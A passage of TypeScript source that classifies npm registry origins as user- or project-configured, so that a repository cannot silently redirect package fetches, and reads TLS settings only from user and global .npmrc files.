 * point of §14.6 is that the answer must be legible.
 *
 * So the rule states the hazard instead: an origin is `"project"` when a source
 * inside the repository named it **and** the user's own configuration did not.
 * Both halves are exhaustively enumerable — the project `.npmrc` files on the
 * §03.1 walk, and the closest project env file — which is what makes a
 * deny-list sound here rather than merely convenient. Anything the repository
 * never mentioned is, by construction, not a redirect it performed.
 *
 * The user's side is checked first: a user who exported `COREPACK_NPM_REGISTRY`
 * or wrote `registry=` in `~/.npmrc` has named that origin themselves, and a
 * project file that happens to name the same one has moved nothing.
 */
export function registryTrustFor(registryUrl: string | undefined, cwd?: string): RegistryTrust {
  if (registryUrl === undefined) return "user";

  let origin: string;
  try {
    origin = new URL(registryUrl).origin;
  } catch {
    return "user";
  }
  if (origin === "null" || origin === DEFAULT_REGISTRY_ORIGIN) return "user";

  const config = loadNpmrc(cwd);
  const environment = envRegistryOrigins(config);
  if (environment.user.has(origin) || config.userRegistryOrigins.has(origin)) return "user";
  if (environment.project.has(origin) || config.projectRegistryOrigins.has(origin)) {
    return "project";
  }
  return "user";
}

/**
 * §05.2 rewrite 1's condition: has the user configured an npm registry that
 * would apply to this package?
 */
export function hasNpmProtocolRegistry(packageName?: string, cwd?: string): boolean {
  return npmProtocolRegistry({ packageName, cwd }) !== undefined;
}

/* -------------------------------------------------------------------------- */
/* TLS — §15.4's middle tier                                                   */
/* -------------------------------------------------------------------------- */

/**
 * `cafile` / `ca` / `strict-ssl` from the **user and global files only**.
 *
 * The project tier never reaches here: `loadNpmrc` refuses those keys from a
 * project file outright, so this is a second statement of the same rule rather
 * than the only one enforcing it.
 */
export function npmrcTlsSettings(cwd?: string): {
  cafile?: { value: string; origin: NpmrcOrigin };
  ca?: { value: string[]; origin: NpmrcOrigin };
  strictSsl?: { value: boolean; origin: NpmrcOrigin };
} {
  const config = loadNpmrc(cwd);
  return { cafile: config.cafile, ca: config.ca, strictSsl: config.strictSsl };
}
